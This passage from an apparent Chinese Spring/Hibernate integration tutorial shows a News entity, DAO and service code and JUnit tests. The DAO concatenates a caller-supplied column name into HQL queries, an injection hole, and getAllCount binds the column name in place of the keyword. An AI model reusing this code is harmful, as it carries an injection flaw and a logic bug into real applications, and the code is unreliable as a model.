class="string">"REQUIRED"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"load*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"list*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">			<span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span></span><br><span class="line"><span class="xml">	</span></span><br><span class="line"><span class="xml">	<span class="comment">&lt;!-- 定义事务的切入点 --&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;<span class="name">aop:config</span> <span class="attr">expose-proxy</span>=<span class="string">"true"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">expression</span>=<span class="string">"execution(* com.tianxingjian..service.*.*(..))"</span> <span class="attr">id</span>=<span class="string">"pointcut"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">"txAdvice"</span> <span class="attr">pointcut-ref</span>=<span class="string">"pointcut"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="2-编写src代码用于本次测试"><a href="#2-编写src代码用于本次测试" class="headerlink" title="2. 编写src代码用于本次测试"></a><strong>2. 编写src代码用于本次测试</strong></h2><h3 id="2-1-生成News-java的POJO类"><a href="#2-1-生成News-java的POJO类" class="headerlink" title="2.1 生成News.java的POJO类"></a><strong>2.1 生成News.java的POJO类</strong></h3><p>我们利用Annotation的注解方式完成：</p>
<ul>
<li>windows -&gt; perspetive -&gt; open perspective -&gt;  database explore -&gt; 右键mysql -&gt; 连接</li>
<li>找到要处理的表 -&gt; 右键Hibernate reverse -&gt; src为项目的src路径，java package一般为com.tianxingjian.pojo -&gt; √create pojo -&gt; 点击add Hibernate mapping annotations to pojo -&gt; next -&gt; id generator -&gt; native -&gt; next -&gt; 点击表然后native -&gt; finish，生成pojo的时候最好把create abstract class取消掉，生成之后为了便于之后的JUnit测试加上toString方法，完整的News.java代码如下：<br>上述操作完成之后pojo类的映射操作将自动保存在hibernate.cfg.xml文件中，代码如下：</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tianxingjian.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Column;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Entity;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.GeneratedValue;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Id;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Table;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Temporal;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.TemporalType;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * News entity. <span class="doctag">@author</span> MyEclipse Persistence Tools</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Table(name = <span class="meta-string">"news"</span>, catalog = <span class="meta-string">"news_db"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">News</span> <span class="title">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Fields</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> Integer nid;</span><br><span class="line">	<span class="keyword">private</span> String title;</span><br><span class="line">	<span class="keyword">private</span> Date date;</span><br><span class="line">	<span class="keyword">private</span> String content;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Constructors</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/** default constructor */</span></span><br><span class="line">	<span class="keyword">public</span> News() &#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** full constructor */</span></span><br><span class="line">	<span class="keyword">public</span> News(String title, Date date, String content) &#123;</span><br><span class="line">		<span class="keyword">this</span>.title = title;</span><br><span class="line">		<span class="keyword">this</span>.date = date;</span><br><span class="line">		<span class="keyword">this</span>.content = content;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Property accessors</span></span><br><span class="line">	<span class="meta">@Id</span></span><br><span class="line">	<span class="meta">@GeneratedValue</span></span><br><span class="line"></span><br><span class="line">	<span class="meta">@Column(name = <span class="meta-string">"nid"</span>, unique = true, nullable = false)</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> Integer getNid() &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.nid;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> void setNid(Integer nid) &#123;</span><br><span class="line">		<span class="keyword">this</span>.nid = nid;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Column(name = <span class="meta-string">"title"</span>, length = 100)</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> String getTitle() &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.title;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> void setTitle(String title) &#123;</span><br><span class="line">		<span class="keyword">this</span>.title = title;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Temporal(TemporalType.DATE)</span></span><br><span class="line">	<span class="meta">@Column(name = <span class="meta-string">"date"</span>, length = 10)</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> Date getDate() &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.date;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> void setDate(Date date) &#123;</span><br><span class="line">		<span class="keyword">this</span>.date = date;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Column(name = <span class="meta-string">"content"</span>, length = 100)</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> String getContent() &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.content;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> void setContent(String content) &#123;</span><br><span class="line">		<span class="keyword">this</span>.content = content;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> String toString() &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"News [nid="</span> + nid + <span class="string">", title="</span> + title + <span class="string">", date="</span> + date + <span class="string">", content="</span> + content + <span class="string">"]\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;mapping <span class="keyword">class</span>=<span class="string">"com.tianxingjian.pojo.News"</span> /&gt;</span><br></pre></td></tr></table></figure>
<h3 id="2-2-定义INewsDAO-java接口"><a href="#2-2-定义INewsDAO-java接口" class="headerlink" title="2.2 定义INewsDAO.java接口"></a><strong>2.2 定义INewsDAO.java接口</strong></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tianxingjian.dao;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.pojo.News;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">INewsDAO</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">doCreate</span><span class="params">(News vo)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">doUpdate</span><span class="params">(News vo)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> News <span class="title">getElementById</span><span class="params">(Integer id)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">doRemoveBatch</span><span class="params">(Set&lt;Integer&gt; ids)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> List&lt;News&gt; <span class="title">findAll</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> List&lt;News&gt; <span class="title">findAllSplit</span><span class="params">(String column, String keyWord, </span></span></span><br><span class="line"><span class="function"><span class="params">			Integer currentPage, Integer lineSize)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Integer <span class="title">getAllCount</span><span class="params">(String column, String keyWord)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-2-实现NewsDAOImpl-java类"><a href="#2-2-实现NewsDAOImpl-java类" class="headerlink" title="2.2 实现NewsDAOImpl.java类"></a><strong>2.2 实现NewsDAOImpl.java类</strong></h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tianxingjian.dao.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="keyword">annotation</span>.Resource;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.Criteria;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.Query;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.SessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.dao.INewsDAO;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.pojo.News;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NewsDAOImpl</span> <span class="title">implements</span> <span class="title">INewsDAO</span> </span>&#123;</span><br><span class="line">	<span class="meta">@Resource</span></span><br><span class="line">	<span class="keyword">private</span> SessionFactory sessionFactory;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> boolean doCreate(News vo) throws Exception &#123;</span><br><span class="line">		<span class="keyword">return</span> sessionFactory.getCurrentSession().save(vo) != <span class="literal">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> boolean doUpdate(News vo) throws Exception &#123;</span><br><span class="line">		String hql = <span class="string">"update News set title=?, date=?, content=? where nid=?"</span>;</span><br><span class="line">		Query query = <span class="keyword">this</span>.sessionFactory.getCurrentSession().createQuery(hql);</span><br><span class="line">		query.setParameter(<span class="number">0</span>, vo.getTitle());</span><br><span class="line">		query.setParameter(<span class="number">1</span>, vo.getDate());</span><br><span class="line">		query.setParameter(<span class="number">2</span>, vo.getContent());</span><br><span class="line">		query.setParameter(<span class="number">3</span>, vo.getNid());</span><br><span class="line">		<span class="keyword">return</span> query.executeUpdate() &gt; <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> News getElementById(Integer id) throws Exception &#123;</span><br><span class="line">		<span class="keyword">return</span> (News) <span class="keyword">this</span>.sessionFactory.getCurrentSession().<span class="keyword">get</span>(News.<span class="keyword">class</span>, id);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> boolean doRemoveBatch(Set&lt;Integer&gt; ids) throws Exception &#123;</span><br><span class="line">		StringBuffer buffer = new StringBuffer();</span><br><span class="line">		buffer.append(<span class="string">"delete from News where nid in ("</span>);</span><br><span class="line">		Iterator&lt;Integer&gt; iterator = ids.iterator();</span><br><span class="line">		<span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">			buffer.append(iterator.next()).append(<span class="string">","</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		buffer.delete(buffer.length()-<span class="number">1</span>, buffer.length()).append(<span class="string">")"</span>);</span><br><span class="line">		Query query = <span class="keyword">this</span>.sessionFactory.getCurrentSession().createQuery(buffer.toString());</span><br><span class="line">		<span class="keyword">return</span> query.executeUpdate() &gt; <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@SuppressWarnings(<span class="meta-string">"unchecked"</span>)</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> List&lt;News&gt; findAll() throws Exception &#123;</span><br><span class="line">		Criteria criteria = <span class="keyword">this</span>.sessionFactory.getCurrentSession().createCriteria(News.<span class="keyword">class</span>);</span><br><span class="line">		<span class="keyword">return</span> criteria.list();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@SuppressWarnings(<span class="meta-string">"unchecked"</span>)</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> List&lt;News&gt; findAllSplit(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception &#123;</span><br><span class="line">		String hql = <span class="string">"from News as n where n."</span> + column + <span class="string">" like ?"</span>;</span><br><span class="line">		Query query = <span class="keyword">this</span>.sessionFactory.getCurrentSession().createQuery(hql);</span><br><span class="line">		query.setParameter(<span class="number">0</span>, <span class="string">"%"</span> + keyWord + <span class="string">"%"</span>);</span><br><span class="line">		query.setFirstResult((currentPage-<span class="number">1</span>)*lineSize);</span><br><span class="line">		query.setMaxResults(lineSize);</span><br><span class="line">		<span class="keyword">return</span> query.list();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> Integer getAllCount(String column, String keyWord) throws Exception &#123;</span><br><span class="line">		String hql = <span class="string">"select count(*) from News as n where n."</span> + column + <span class="string">" like ?"</span>;</span><br><span class="line">		Query query = <span class="keyword">this</span>.sessionFactory.getCurrentSession().createQuery(hql);</span><br><span class="line">		query.setParameter(<span class="number">0</span>, <span class="string">"%"</span> + column + <span class="string">"%"</span>);</span><br><span class="line">		<span class="built_in">Long</span> count = (<span class="built_in">Long</span>) query.uniqueResult();</span><br><span class="line">		<span class="keyword">return</span> count.intValue();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-3-定义业务层INewsService-java接口"><a href="#2-3-定义业务层INewsService-java接口" class="headerlink" title="2.3 定义业务层INewsService.java接口"></a><strong>2.3 定义业务层INewsService.java接口</strong></h3><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">package com.tianxingjian.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.<span class="built_in">List</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="built_in">Map</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="built_in">Set</span>;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.pojo.News;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> interface INewsService &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">boolean</span> insert(News vo) throws Exception;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">boolean</span> update(News vo) throws Exception;</span><br><span class="line">	<span class="keyword">public</span> News get(<span class="built_in">Integer</span> id) throws Exception;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">boolean</span> delete(<span class="built_in">Set</span>&lt;<span class="built_in">Integer</span>&gt; ids) throws Exception;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">List</span>&lt;News&gt; <span class="built_in">list</span>() throws Exception;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">Map</span>&lt;<span class="built_in">String</span>, Object&gt; <span class="built_in">list</span>(<span class="built_in">String</span> column, <span class="built_in">String</span> <span class="built_in">keyWord</span>, </span><br><span class="line">			<span class="built_in">Integer</span> currentPage, <span class="built_in">Integer</span> lineSize) throws Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-4-编写测试程序，用JUnit"><a href="#2-4-编写测试程序，用JUnit" class="headerlink" title="2.4 编写测试程序，用JUnit"></a><strong>2.4 编写测试程序，用JUnit</strong></h3><blockquote>
<ul>
<li>点击IServiceImpl</li>
<li>点击MyEclipse右上角的New图标</li>
<li>查询Junit Test Case</li>
<li>将package改为com.tianxingjian.test -&gt; next</li>
<li>全选 -&gt; finish</li>
</ul>
</blockquote>
<p>使用JUnit进行单个方法的测试：</p>
<ol>
<li>选中需要测试的类</li>
<li>把类进行展开</li>
<li>把C进行展开</li>
<li>就可以看到测试类中所有的方法</li>
<li>点击所需要运行的测试方法然后右键junit运行就行了</li>
</ol>
<p><strong>_注意: 在写hql语句的时候表名应该大写表示对象而不是小写，如下所示_</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String hql = "<span class="keyword">update</span> News <span class="keyword">set</span> title=?,<span class="built_in">date</span>=?,<span class="keyword">content</span>=? <span class="keyword">where</span> nid=?<span class="string">";  // 正确</span></span><br><span class="line"><span class="string">String hql = "</span><span class="keyword">update</span> news <span class="keyword">set</span> title=?,<span class="built_in">date</span>=?,<span class="keyword">content</span>=? <span class="keyword">where</span> nid=?<span class="string">";  // 错误</span></span><br></pre></td></tr></table></figure>
<p>完整JUnit测试代码如下：</p>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tianxingjian.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.Assert.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.pojo.News;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.service.INewsService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> junit.framework.TestCase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> INewsServiceTest &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> ApplicationContext ctx;</span><br><span class="line">	<span class="keyword">static</span> &#123;</span><br><span class="line">		ctx = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"applicationContext.xml"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">@Test</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> testInsert() &#123;</span><br><span class="line">		INewsService service = ctx.getBean(<span class="string">"newsServiceImpl"</span>, INewsService.<span class="keyword">class</span>);</span><br><span class="line">		News vo = <span class="keyword">new</span> News();</span><br><span class="line">		vo.setTitle(<span class="string">"SSH整合了-"</span> + System.currentTimeMillis());</span><br><span class="line">		vo.setDate(<span class="keyword">new</span> Date());</span><br><span class="line">		vo.setContent(<span class="string">"SSH内容很丰富！"</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			TestCase.assertEquals(service.insert(vo), <span class="literal">true</span>);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">@Test</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> testUpdate() &#123;</span><br><span class="line">		INewsService service = ctx.getBean(<span class="string">"newsServiceImpl"</span>, INewsService.<span class="keyword">class</span>);</span><br><span class="line">		News vo = <span class="keyword">new</span> News();</span><br><span class="line">		vo.setNid(<span class="number">5</span>);</span><br><span class="line">		vo.setTitle(<span class="string">"准备开始学习了！"</span>);</span><br><span class="line">		vo.setDate(<span class="keyword">new</span> Date());</span><br><span class="line">		vo.setContent(<span class="string">"你高兴么！"</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			TestCase.assertEquals(service.update(vo), <span class="literal">true</span>);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">@Test</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> testGet() &#123;</span><br><span class="line">		INewsService service = ctx.getBean(<span class="string">"newsServiceImpl"</span>, INewsService.<span class="keyword">class</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			System.<span class="keyword">out</span>.println(service.get(<span class="number">1</span>));</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">@Test</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> testDelete() &#123;</span><br><span class="line">		INewsService service = ctx.getBean(<span 